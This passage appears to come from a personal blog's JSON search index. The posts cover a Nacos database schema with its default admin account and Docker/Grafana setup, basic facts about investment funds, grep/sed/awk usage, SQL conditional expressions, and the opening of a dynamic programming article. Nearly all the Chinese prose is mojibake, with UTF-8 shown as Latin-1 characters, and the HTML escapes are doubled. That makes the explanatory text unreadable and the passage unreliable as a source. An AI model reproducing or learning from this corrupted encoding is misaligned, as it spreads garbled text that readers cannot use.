\u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;åˆ›å»ºæ—¶é—´\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;ä¿®æ”¹æ—¶é—´\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_group_id` (`group_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;é›†ç¾¤ã€å„Groupå®¹é‡ä¿¡æ¯è¡¨\u0026#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = his_config_info */ /******************************************/ CREATE TABLE `his_config_info` ( `id` bigint(64) unsigned NOT NULL, `nid` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `data_id` varchar(255) NOT NULL, `group_id` varchar(128) NOT NULL, `app_name` varchar(128) DEFAULT NULL COMMENT \u0026#39;app_name\u0026#39;, `content` longtext NOT NULL, `md5` varchar(32) DEFAULT NULL, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39;, `src_user` text, `src_ip` varchar(20) DEFAULT NULL, `op_type` char(10) DEFAULT NULL, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;ç§Ÿæˆ·å­—æ®µ\u0026#39;, PRIMARY KEY (`nid`), KEY `idx_gmt_create` (`gmt_create`), KEY `idx_gmt_modified` (`gmt_modified`), KEY `idx_did` (`data_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;å¤šç§Ÿæˆ·æ”¹é€ \u0026#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = tenant_capacity */ /******************************************/ CREATE TABLE `tenant_capacity` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT \u0026#39;ä¸»é”®ID\u0026#39;, `tenant_id` varchar(128) NOT NULL DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;Tenant ID\u0026#39;, `quota` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;é…é¢ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼\u0026#39;, `usage` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;ä½¿ç”¨é‡\u0026#39;, `max_size` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;å•ä¸ªé…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼\u0026#39;, `max_aggr_count` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;èšåˆå­é…ç½®æœ€å¤§ä¸ªæ•°\u0026#39;, `max_aggr_size` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;å•ä¸ªèšåˆæ•°æ®çš„å­é…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼\u0026#39;, `max_history_count` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;æœ€å¤§å˜æ›´å†å²æ•°é‡\u0026#39;, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;åˆ›å»ºæ—¶é—´\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;ä¿®æ”¹æ—¶é—´\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_tenant_id` (`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;ç§Ÿæˆ·å®¹é‡ä¿¡æ¯è¡¨\u0026#39;; CREATE TABLE `tenant_info` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \u0026#39;id\u0026#39;, `kp` varchar(128) NOT NULL COMMENT \u0026#39;kp\u0026#39;, `tenant_id` varchar(128) default \u0026#39;\u0026#39; COMMENT \u0026#39;tenant_id\u0026#39;, `tenant_name` varchar(128) default \u0026#39;\u0026#39; COMMENT \u0026#39;tenant_name\u0026#39;, `tenant_desc` varchar(256) DEFAULT NULL COMMENT \u0026#39;tenant_desc\u0026#39;, `create_source` varchar(32) DEFAULT NULL COMMENT \u0026#39;create_source\u0026#39;, `gmt_create` bigint(20) NOT NULL COMMENT \u0026#39;åˆ›å»ºæ—¶é—´\u0026#39;, `gmt_modified` bigint(20) NOT NULL COMMENT \u0026#39;ä¿®æ”¹æ—¶é—´\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_tenant_info_kptenantid` (`kp`,`tenant_id`), KEY `idx_tenant_id` (`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;tenant_info\u0026#39;; CREATE TABLE users ( username varchar(50) NOT NULL PRIMARY KEY, password varchar(500) NOT NULL, enabled boolean NOT NULL ); CREATE TABLE roles ( username varchar(50) NOT NULL, role varchar(50) NOT NULL, constraint uk_username_role UNIQUE (username,role) ); CREATE TABLE permissions ( role varchar(50) NOT NULL, resource varchar(512) NOT NULL, action varchar(8) NOT NULL, constraint uk_role_permission UNIQUE (role,resource,action) ); INSERT INTO users (username, password, enabled) VALUES (\u0026#39;nacos\u0026#39;, \u0026#39;$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu\u0026#39;, TRUE); INSERT INTO roles (username, role) VALUES (\u0026#39;nacos\u0026#39;, \u0026#39;ROLE_ADMIN\u0026#39;); åˆ°æ­¤ï¼Œå°±å¯ä»¥å¯åŠ¨Docker,docker-compose up -d è¿è¡ŒæœåŠ¡ï¼Œç„¶åè®¿é—®æœåŠ¡ http://æœåŠ¡å™¨åœ°å€:8848/nacos/,è´¦å·å¯†ç æ˜¯nacos:nacosã€‚\nPrometheusç›‘æ§ä¸­å¿ƒåœ°å€ï¼š http://æœåŠ¡å™¨åœ°å€:9090/graphã€‚ grafanaå›¾å½¢åŒ–æœåŠ¡åœ°å€: http://æœåŠ¡å™¨åœ°å€:3000/,å½“ç„¶ï¼Œè¿›å…¥grafanaåï¼Œè¿˜éœ€è¦å»è¿æ¥ä¸€ä¸‹Prometheusç›‘æ§ä¸­å¿ƒæ‰èƒ½å¤Ÿå±•ç¤ºå‡ºç›‘æ§çš„çŠ¶æ€ä¿¡æ¯ã€‚\n6ã€grafanaè¿æ¥Prometheusç›‘æ§ä¸­å¿ƒ\nConfiguration -\u0026gt; Data Sources é€‰æ‹©ä¸€ä¸ª prometheusçš„data sourceè¿›è¡Œè¿æ¥ï¼Œå¡«å†™Name ä¸º prometheus ï¼ŒHttp URL ä¸ºä½ çš„Prometheusç›‘æ§ä¸­å¿ƒåœ°å€å³å¯ã€‚\n#\r"},{"id":66,"href":"/posts/history/%E5%9F%BA%E9%87%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/","title":"åŸºé‡‘çš„åŸºæœ¬çŸ¥è¯†","section":"æˆ‘çš„åšå®¢","content":"\råŸºé‡‘çš„åŸºæœ¬çŸ¥è¯†\r#\råŸºé‡‘ç±»å‹\r#\råŸºæœ¬æœ‰è´§å¸åŸºé‡‘ã€å€ºåˆ¸åŸºé‡‘å’Œè‚¡ç¥¨åŸºé‡‘ï¼Œå…¶ä¸­è´§å¸åŸºé‡‘çš„é£é™©æœ€è¿‘ï¼ŒåŒæ—¶æ”¶ç›Šä¹Ÿæ˜¯æœ€è¿‘çš„ï¼›å€ºåˆ¸åŸºé‡‘çš„é£é™©ç›¸å¯¹æ¥è¯´æ˜¯ä¸­ç­‰çš„ï¼ŒåŒæ—¶æ”¶ç›Šä¹Ÿæ˜¯ä¸­ç­‰çš„ï¼›æœ€åè‚¡ç¥¨åŸºé‡‘æ˜¯é£é™©æœ€å¤§çš„ï¼ŒåŒæ—¶ï¼Œæ”¶ç›Šä¹Ÿæ˜¯æœ€å¤§çš„ã€‚\næŒ‡æ•°åŸºé‡‘\r#\rå·´è²ç‰¹æ¨èçš„åŸºé‡‘æ˜¯æŒ‡æ•°åŸºé‡‘ï¼ŒæŒ‡æ•°åŸºé‡‘æ˜¯ä¸€ç§ç‰¹æ®Šçš„è‚¡ç¥¨åŸºé‡‘ï¼Œå®ƒå¯å¤åˆ¶å’Œè¿½è¸ªæŒ‡æ•°ï¼›æŒ‡æ•°åŸºé‡‘è¿½è¸ªæŒ‡æ•°ï¼ŒæŒ‰ç…§æŒ‡æ•°çš„è§„åˆ™æ¥é€‰è‚¡ï¼›ä¸”æ˜¯è¢«åŠ¨æŠ•èµ„ï¼Œæ— äººä¸ºå› ç´ å¹²æ‰°ï¼Œé€æ˜åº¦é«˜ï¼Œè§„åˆ™æ¸…æ™°ï¼Œé•¿æœŸå¯é ã€‚\nä¸€äº›åŸºæœ¬çš„æè¿°è¯´æ˜\n1ã€åŸºé‡‘çš„æ‰‹ç»­è´¹ç”¨ï¼š\næŒ‡æ•°åŸºé‡‘ï¼š0.06%-0.08% / å¹´\næ™®é€šåŸºé‡‘ï¼š0.12%-0.2% / å¹´\n2ã€åŸºé‡‘ä»£ç \nAè‚¡åŸºé‡‘ï¼š6ä½æ•°å­—ï¼ˆå¦‚ï¼š510880 ä¸Šè¯çº¢åˆ©ï¼‰\næ¸¯è‚¡åŸºé‡‘ï¼š5ä½æ•°å­—ï¼ˆå¦‚ï¼š02828 æ’ç”Ÿï¼‰\nç¾è‚¡åŸºé‡‘ï¼š3-5ä½è‹±æ–‡å­—ç¬¦ï¼ˆå¦‚ï¼šapy æ ‡æ™®500ï¼‰\n3ã€åŸºé‡‘çš„å‡€å€¼\nä¸€åªåŸºé‡‘ï¼Œå‡€å€¼1.5å…ƒã€‚æ˜¯æ¯ä¸€ä»½è¿™æ ·çš„åŸºé‡‘ä»½é¢ï¼Œå…¶ä¸­åŒ…å«çš„è‚¡ç¥¨ç­‰é‡‘èèµ„äº§ï¼Œå¸‚å€¼ ä¸º1.5å…ƒã€‚\nå¦‚ï¼š1å…ƒå‡€å€¼å’Œ2å…ƒå‡€å€¼çš„åŸºé‡‘ï¼Œä¹°100å…ƒåŸºé‡‘ï¼Œ1å…ƒçš„å‡€å€¼åŸºé‡‘å¯ä»¥ä¹°åˆ°100è‚¡ï¼Œè€Œ2å…ƒå‡€å€¼çš„åŸºé‡‘åªèƒ½ä¹°åˆ°50è‚¡ã€‚\nå›½å†…çš„åŸºé‡‘å‡€å€¼ä¸€èˆ¬éƒ½æ˜¯1-3å…ƒä¸€è‚¡çš„ã€‚\n4ã€åœºå†…å’Œåœºå¤–åŸºé‡‘\nåœºå†…åŸºé‡‘æ˜¯å¯ä»¥åœ¨è¯åˆ¸äº¤æ˜“æ‰€è¿›è¡Œä¹°å–äº¤æ˜“çš„åŸºé‡‘ï¼Œåœºå¤–åŸºé‡‘æ˜¯å¯ä»¥ç›´æ¥åœ¨åŸºé‡‘äº¤æ˜“å¹³å°è¿›è¡Œç”³èµçš„åŸºé‡‘ã€‚\n5ã€è¿æ¥åŸºé‡‘\næ˜¯åŸºé‡‘å…¬å¸å¼€å‘çš„ç‰¹æ®Šäº§å“ï¼Œæ–¹ä¾¿æ²¡æœ‰åœºå†…è‚¡ç¥¨è´¦æˆ·çš„æŠ•èµ„è€…ä¹Ÿå¯ä»¥æŠ•èµ„åœºå†…çš„åŸºé‡‘ã€‚è”æ¥åŸºé‡‘ä¹Ÿæ˜¯æŒ‡æ•°åŸºé‡‘ã€‚\n6ã€LOFåŸºé‡‘\næ˜¯åŒæ—¶å¯ä»¥åœ¨åœºå†…å’Œåœºå¤–è´­ä¹°åˆ°çš„åŸºé‡‘ï¼Œå®ƒåœ¨åœºå†…å’Œåœºå¤–çš„åŸºé‡‘ä»£ç éƒ½æ˜¯ä¸€è‡´çš„ã€‚\n7ã€Aè‚¡/Hè‚¡\nAè‚¡ï¼šå›½å†…ä¼ä¸šåœ¨å†…åœ°ä¸Šå¸‚\nHè‚¡ï¼šå›½å†…ä¼ä¸šåœ¨é¦™æ¸¯ä¸Šå¸‚\n8ã€äº¤æ˜“è§„åˆ™\nä¸‹åˆ3ç‚¹æ˜¯äº¤æ˜“çš„åˆ†éš”çº¿ï¼Œ3ç‚¹ä¹‹å‰ç”³è´­å’Œèµå›æ˜¯å½“å¤©çš„åŸºé‡‘æ”¶ç›˜å‡€å€¼æˆäº¤ï¼Œ3ç‚¹ä¹‹åç”³è´­å’Œèµå›æ˜¯ç¬¬äºŒå¤©äº¤æ˜“æ—¥åŸºé‡‘çš„æ”¶ç›˜çš„å‡€å€¼æˆäº¤ã€‚\n9ã€äº¤æ˜“æ—¥å’Œäº¤æ˜“æ—¶é—´\näº¤æ˜“æ—¥ï¼šéèŠ‚å‡æ—¥çš„å‘¨ä¸€åˆ°å‘¨äº”\näº¤æ˜“æ—¶é—´ï¼šä¸Šåˆ9.30 - 11.30 ä¸‹åˆ13.00 - 15.00\n10ã€åŸºé‡‘æ€§è´¨\nLOFåŸºé‡‘ï¼šå¼€æ”¾å‹åŸºé‡‘ï¼Œå¯ä»¥éšæ—¶ä¹°å…¥å’Œå–å‡º FOFåŸºé‡‘ï¼šæŠ•èµ„åŸºé‡‘çš„åŸºé‡‘ QDIIåŸºé‡‘ï¼šæŠ•èµ„æµ·å¤–è‚¡ç¥¨çš„åŸºé‡‘ åŸºé‡‘åé¢å¸¦Aï¼šé€‚åˆé•¿æœŸæŠ•èµ„ï¼ŒçŸ­æœŸå–å‡ºè´¹ç”¨å¾ˆé«˜ åŸºé‡‘åé¢å¸¦Cï¼šé€‚åˆçŸ­æœŸæŠ•èµ„ï¼Œé•¿æœŸå–å‡ºè´¹ç”¨å¾ˆé«˜\næŒ‡æ•°ç±»å‹\r#\r1ã€ä¸Šè¯50æŒ‡æ•°\nä¸“é—¨æŠ•èµ„å¤§å‹ä¼ä¸šï¼Œæ˜¯ä»ä¸Šæµ·äº¤è¯åˆ¸æ˜“æ‰€é€‰æ‹©çš„50å®¶ä¼ä¸šã€‚\nå‚è€ƒï¼šåå¤ä¸Šè¯50ETF ä»£ç 510050ï¼Œæ˜“æ–¹è¾¾ä¸Šè¯50 ä»£ç 110003\n2ã€æ²ªæ·±300æŒ‡æ•°\nä¸“é—¨æŠ•èµ„å¤§ä¸­å‹ä¼ä¸šï¼Œæ˜¯ä»æ·±åœ³å’Œä¸Šæµ·è¯åˆ¸äº¤æ˜“æ‰€é€‰æ‹©çš„300å®¶ä¼ä¸šã€‚\nå‚è€ƒï¼šåæ³°æŸç‘æ²ªæ·±300ETF ä»£ç 510300ï¼Œå˜‰å®æ²ªæ·±300ETFè”æ¥160706\n3ã€ä¸­è¯500æŒ‡æ•°\nä¸“é—¨æŠ•èµ„ä¸­å°å‹ä¼ä¸šï¼Œæ˜¯ä»æ·±åœ³å’Œä¸Šæµ·è¯åˆ¸äº¤æ˜“æ‰€é€‰æ‹©è§„æ¨¡å¤„äº301-800ä½çš„500å®¶ä¸­å°å‹ä¼ä¸šã€‚\nå‚è€ƒï¼šå—æ–¹ä¸­è¯500ETF ä»£ç 510500ï¼Œå—æ–¹ä¸­è¯500ETFè”æ¥ ä»£ç  160119\n4ã€çº¢åˆ©æŒ‡æ•°\nä¸Šè¯çº¢åˆ©ï¼šä»ä¸Šæµ·è¯åˆ¸äº¤æ˜“æ‰€é€‰ç°é‡‘åˆ†çº¢æœ€é«˜çš„50å®¶å…¬å¸ã€‚\nå‚è€ƒï¼šåœºå†…çº¢åˆ©ETF ä»£ç 510880ï¼Œ\nä¸­è¯çº¢åˆ©ï¼šä»æ·±åœ³å’Œä¸Šæµ·è¯åˆ¸äº¤æ˜“æ‰€é€‰100å®¶ç°é‡‘åˆ†çº¢æœ€é«˜çš„100å®¶å…¬å¸ã€‚\nå‚è€ƒï¼šåœºå¤–å¯Œå›½ä¸­è¯çº¢åˆ© ä»£ç 100032\nçº¢åˆ©æœºä¼šæŒ‡æ•°ï¼šé€‰100åªé«˜è‚¡æ¯ç‡è‚¡ç¥¨ï¼Œä½†æ˜¯å¯¹è‚¡ç¥¨çš„ç›ˆåˆ©èƒ½åŠ›æœ‰è¦æ±‚ã€‚\nå‚è€ƒï¼šåå®æ ‡æ™®ä¸­å›½Aè‚¡çº¢åˆ©æœºä¼š(LOF) ä»£ç 501029\n5ã€æ’ç”ŸæŒ‡æ•°\nä¸“é—¨ æŠ•èµ„é¦™æ¸¯ä¸Šå¸‚å¤§å‹ä¼ä¸š\nå‚è€ƒï¼šåœºå†…åå¤æ’ç”ŸETFï¼Œåœºå¤–åå¤æ’ç”ŸETFè”æ¥\n6ã€Hè‚¡æŒ‡æ•°\nä¸“é—¨æŠ•èµ„é¦™æ¸¯ä¸Šå¸‚å†…åœ°ä¼ä¸š\nå‚è€ƒï¼šåœºå†…æ˜“æ–¹è¾¾Hè‚¡ETF ä»£ç 510900ï¼Œåœºå¤–æ˜“æ–¹è¾¾Hè‚¡ETFè”æ¥ ä»£ç 110031\næŠ•èµ„è´­ä¹°\r#\rä½¿ç”¨å¹³å°ï¼šæ”¯ä»˜å®çš„åŸºé‡‘å¹³å°\n"},{"id":67,"href":"/posts/history/linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E5%A4%A7%E4%B8%89%E5%88%A9%E5%99%A8grepsedawk/","title":"Linuxæ–‡æœ¬å¤„ç†å¤§ä¸‰åˆ©å™¨grepã€sedã€awk","section":"æˆ‘çš„åšå®¢","content":"\rgrep\r#\rç”¨äºæŸ¥æ‰¾æ–‡ä»¶é‡Œç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²ã€‚\n1ã€grep [æŸ¥æ‰¾å†…å®¹ï¼Œæ”¯æŒæ­£åˆ™] [æ–‡ä»¶ï¼Œæ”¯æŒæ­£åˆ™] 2ã€cat [æ–‡ä»¶] | grep [æŸ¥æ‰¾å†…å®¹ï¼Œæ”¯æŒæ­£åˆ™]\nsed\r#\rä¸»è¦ç”¨æ¥è‡ªåŠ¨ç¼–è¾‘ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ã€ç®€åŒ–å¯¹æ–‡ä»¶çš„åå¤æ“ä½œã€ç¼–å†™è½¬æ¢ç¨‹åºç­‰ã€‚\nsed [-hnV] [-e \u0026lt;script\u0026gt;] [-f\u0026lt;scriptæ–‡ä»¶\u0026gt;] [æ–‡æœ¬æ–‡ä»¶] å‚æ•°è¯´æ˜ï¼š\n-e\u0026lt;script\u0026gt;æˆ–\u0026ndash;expression=\u0026lt;script\u0026gt; ä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ã€‚\n-f\u0026lt;scriptæ–‡ä»¶\u0026gt;æˆ–\u0026ndash;file=\u0026lt;scriptæ–‡ä»¶\u0026gt; ä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ–‡ä»¶æ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ã€‚\n-hæˆ–\u0026ndash;help æ˜¾ç¤ºå¸®åŠ©ã€‚\n-næˆ–\u0026ndash;quietæˆ–\u0026ndash;silent ä»…æ˜¾ç¤ºscriptå¤„ç†åçš„ç»“æœã€‚\n-Væˆ–\u0026ndash;version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚\nåŠ¨ä½œè¯´æ˜ï¼š\na ï¼šæ–°å¢ï¼Œ a çš„åé¢å¯ä»¥æ¥å­—ä¸²ï¼Œè€Œè¿™äº›å­—ä¸²ä¼šåœ¨æ–°çš„ä¸€è¡Œå‡ºç°(ç›®å‰çš„ä¸‹ä¸€è¡Œ) c ï¼šå–ä»£ï¼Œ c çš„åé¢å¯ä»¥æ¥å­—ä¸²ï¼Œè¿™äº›å­—ä¸²å¯ä»¥å–ä»£ n1,n2 ä¹‹é—´çš„è¡Œ d ï¼šåˆ é™¤ã€‚ i ï¼šæ’å…¥ï¼Œ i çš„åé¢å¯ä»¥æ¥å­—ä¸²ï¼Œè€Œè¿™äº›å­—ä¸²ä¼šåœ¨æ–°çš„ä¸€è¡Œå‡ºç°(ç›®å‰çš„ä¸Šä¸€è¡Œ) p ï¼šæ‰“å°ï¼Œäº¦å³å°†æŸä¸ªé€‰æ‹©çš„æ•°æ®å°å‡ºã€‚é€šå¸¸ p ä¼šä¸å‚æ•° sed -n ä¸€èµ·è¿è¡Œ s ï¼šå–ä»£ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œå–ä»£çš„å·¥ä½œå“©ï¼é€šå¸¸è¿™ä¸ª s çš„åŠ¨ä½œå¯ä»¥æ­é…æ­£è§„è¡¨ç¤ºæ³•ï¼ä¾‹å¦‚ 1,20s/old/new/g 1ã€ä»¥è¡Œä¸ºå•ä½çš„æ–°å¢/åˆ é™¤\n# ä»¥ä¸‹åªä¿®æ”¹äº†è¾“å‡ºçš„æ–‡ä»¶æµï¼Œæ²¡æœ‰ä¿®æ”¹åŸæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨sed -i -e \u0026#39;2d\u0026#39; test.txtè¿™ç§æ–¹å¼ä¿®æ”¹åŸæ–‡ä»¶ nl test.txt | sed -e \u0026#39;2,5d\u0026#39; # åˆ é™¤ç¬¬äºŒåˆ°ç¬¬äº”è¡Œ nl test.txt | sed -e \u0026#39;2d\u0026#39; # åˆ é™¤ç¬¬äºŒè¡Œ nl test.txt | sed -e \u0026#39;3,$d\u0026#39; # åˆ é™¤3åˆ°æœ€åä¸€è¡Œ nl test.txt | sed -e \u0026#39;2a drink team\u0026#39; # åœ¨ç¬¬äºŒè¡Œåé¢æ·»åŠ  nl test.txt | sed -e \u0026#39;2a drink team\u0026#39; # åœ¨ç¬¬äºŒè¡Œå‰é¢æ·»åŠ  2ã€ä»¥è¡Œä¸ºå•ä½çš„æ›¿æ¢ä¸æ˜¾ç¤º\nnl test.txt | sed \u0026#39;2,5c replace 2-5\u0026#39; # æ›¿æ¢2-5è¡Œå†…å®¹æˆreplace 2-5 nl test.txt | sed -n \u0026#39;5,7p\u0026#39; # æ‰“å°5-7è¡Œä¿¡æ¯ï¼Œ-næˆ–--quietæˆ–--silent ä»…æ˜¾ç¤ºscriptå¤„ç†åçš„ç»“æœã€‚ 3ã€æ•°æ®çš„æœå¯»å¹¶æ˜¾ç¤º\nnl test.txt | sed -n \u0026#39;/content/p\u0026#39; # æŸ¥æ‰¾å«æœ‰contentçš„è¡Œå¹¶æ˜¾ç¤º 4ã€æ•°æ®çš„æœå¯»å¹¶åˆ é™¤\nnl test.txt | sed \u0026#39;/content/d\u0026#39; # æŸ¥æ‰¾å«æœ‰contentçš„è¡Œå¹¶åˆ é™¤ 5ã€æ•°æ®çš„æœå¯»å¹¶æ‰§è¡Œå‘½ä»¤\n# æ‰§è¡Œåé¢èŠ±æ‹¬å·ä¸­çš„ä¸€ç»„å‘½ä»¤ï¼Œæ¯ä¸ªå‘½ä»¤ä¹‹é—´ç”¨åˆ†å·åˆ†éš” nl test.txt | sed -n \u0026#39;/9/{s/9/è¿™ä¸ªæ˜¯9/g;p}\u0026#39; # æŸ¥æ‰¾9å¹¶æŠŠ9æ¢æˆâ€˜è¿™ä¸ªæ˜¯9â€™ï¼Œç„¶åæ‰“å°ã€‚ 6ã€æ•°æ®çš„æœå¯»å¹¶æ›¿æ¢\nsed \u0026#39;s/è¦è¢«å–ä»£çš„å­—ä¸²/æ–°çš„å­—ä¸²/g\u0026#39; # æ›¿æ¢æ–‡æœ¬ 7ã€å¤šç‚¹ç¼–è¾‘\nsed -i -e \u0026#39;2i æ·»åŠ å†…å®¹\u0026#39; -e \u0026#39;3,4d\u0026#39; test.txt # æ·»åŠ å†…å®¹å¹¶åˆ é™¤3-4è¡Œ 8ã€ç›´æ¥ä¿®æ”¹æ–‡ä»¶å†…å®¹(å±é™©åŠ¨ä½œ)\n# ä¸»è¦æ˜¯ä½¿ç”¨ -i sed -i -e \u0026#39;2d\u0026#39; test.txt # ç›´æ¥åˆ é™¤æ–‡ä»¶ç¬¬äºŒè¡Œ awk\r#\ræ˜¯ä¸€ç§å¤„ç†æ–‡æœ¬æ–‡ä»¶çš„è¯­è¨€ï¼Œæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬åˆ†æå·¥å…·ã€‚\nè¯­æ³•ï¼š\nawk [é€‰é¡¹å‚æ•°] \u0026#39;script\u0026#39; var=value file(s) awk [é€‰é¡¹å‚æ•°] -f scriptfile var=value file(s) ç”¨æ³•\n1ã€æ­£å¸¸ä½¿ç”¨\nawk \u0026#39;{[pattern] action}\u0026#39; {filenames} # è¡ŒåŒ¹é…è¯­å¥ awk \u0026#39;\u0026#39; åªèƒ½ç”¨å•å¼•å· awk \u0026#39;{print $1,$4}\u0026#39; test.txt # æ¯è¡ŒæŒ‰ç©ºæ ¼æˆ–TABåˆ†å‰²ï¼Œè¾“å‡ºæ–‡æœ¬ä¸­çš„1ã€4é¡¹ awk \u0026#39;{printf \u0026#34;%-8s %-10s\u0026#34;, $1, $4}\u0026#39; # æ ¼å¼åŒ–è¾“å‡ºprintf 2ã€æŒ‡å®šåˆ†éš”ç¬¦\nawk -F \u0026#39;åˆ†éš”å­—ç¬¦ï¼Œæ”¯æŒæ­£åˆ™\u0026#39; # -Fç›¸å½“äºå†…ç½®å˜é‡FS, æŒ‡å®šåˆ†å‰²å­—ç¬¦ awk -F \u0026#39;,\u0026#39; \u0026#39;{print $1 $2}\u0026#39; test.txt # ä»¥,åˆ†éš”å­—ç¬¦ä¸²å¦‚ï¼š123,45ï¼Œ$1æ˜¯123ï¼Œ$2æ˜¯45 3ã€è®¾ç½®å˜é‡\nawk -v # è®¾ç½®å˜é‡ awk -va=1 -vb=s \u0026#39;{print $1,$1+a,$1b}\u0026#39; test.txt "},{"id":68,"href":"/posts/history/sql%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/","title":"Sqlæ¡ä»¶è¯­å¥","section":"æˆ‘çš„åšå®¢","content":"\rIFè¡¨è¾¾å¼\r#\rè¯­æ³•ï¼šIF(expr1, expr2, expr3) è§£é‡Šï¼šå¦‚æœexpr1ç»“æœä¸ºtrueï¼Œåˆ™ä½¿ç”¨expr2å€¼ï¼Œå¦åˆ™ä½¿ç”¨expr3å€¼ã€‚\nä½¿ç”¨ï¼š\nselect id, name, age, IF(sex=1,\u0026#39;ç”·\u0026#39;,\u0026#39;å¥³\u0026#39;) as sex from student IFNULL\r#\rè¯­æ³•ï¼šIFNULL(expr1, expr2) è§£é‡Šï¼šå¦‚æœexpr1ä¸ä¸ºç©ºï¼Œåˆ™è¾“å‡ºexpr1çš„å€¼ï¼Œå¦åˆ™è¾“å‡ºexpr2çš„å€¼ã€‚\nä½¿ç”¨ï¼š\nselect IFNULL(1,0) --è¾“å‡º1 select IFNULL(NULL,0) --è¾“å‡º0 IF ELSEIF ELSE\r#\rè¯­æ³•ï¼š\nIF search_condition THEN statement_list [ELSEIF search_condition THEN] statement_list ... [ELSE statement_list] END IF CASE THEN\r#\rè¯­æ³•ï¼š\nCASE search_condition WHEN expr1 THEN value1 WHEN expr2 THEN value2 ELSE value3 END ä½¿ç”¨ï¼š\nSELECT id, name, CASE sex WHEN 1 THEN \u0026#39;ç”·\u0026#39; WHEN 2 THEN \u0026#39;å¥³\u0026#39; ELSE \u0026#39;ä¿å¯†\u0026#39; END AS sex from student æµ‹è¯•æ•°æ®åº“è¯­å¥ï¼š\nCREATE TABLE `student` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(20) DEFAULT NULL COMMENT \u0026#39;å§“å\u0026#39;, `age` int(11) DEFAULT NULL COMMENT \u0026#39;å¹´é¾„\u0026#39;, `sex` tinyint(1) DEFAULT NULL COMMENT \u0026#39;æ€§åˆ«ï¼Œ1ç”·ï¼Œ2å¥³\u0026#39;, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=\u0026#39;å­¦ç”Ÿè¡¨\u0026#39;; "},{"id":69,"href":"/posts/history/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/","title":"åŠ¨æ€è§„åˆ’","section":"æˆ‘çš„åšå®¢","content":"\råŠ¨æ€è§„åˆ’çš„å®šä¹‰\r#\ræœ€ä¼˜å­ç»“æ„ï¼ˆæ•°å­¦ä¼˜åŒ–æ–¹æ³•ï¼‰ åŠ¨æ€è§„åˆ’æ˜¯æ•°å­¦ä¼˜åŒ–çš„æ–¹æ³•æŒ‡ï¼ŒåŠ¨æ€è§„åˆ’è¦è§£å†³çš„éƒ½æ˜¯é—®é¢˜çš„æœ€ä¼˜è§£ã€‚è€Œä¸€ä¸ªé—®é¢˜çš„æœ€ä¼˜è§£æ˜¯ç”±å®ƒçš„å„ä¸ªå­é—®é¢˜çš„æœ€ä¼˜è§£å†³å®šçš„ã€‚ é‡å å­é—®é¢˜ï¼ˆç¼–ç¨‹æ–¹æ³•ï¼‰ 